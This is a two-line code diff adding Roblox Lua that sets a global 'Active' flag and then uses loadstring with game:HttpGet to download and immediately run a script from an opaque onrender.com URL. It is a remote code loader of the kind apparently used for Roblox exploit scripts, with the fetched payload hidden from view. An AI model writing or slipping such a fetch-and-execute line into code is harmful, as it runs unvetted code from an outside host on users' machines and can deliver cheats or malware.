@@ -1,0 +1,2 @@
+_G.Active = true
+loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/adee4d4ed01f2354bbde87c6f697100f"))()
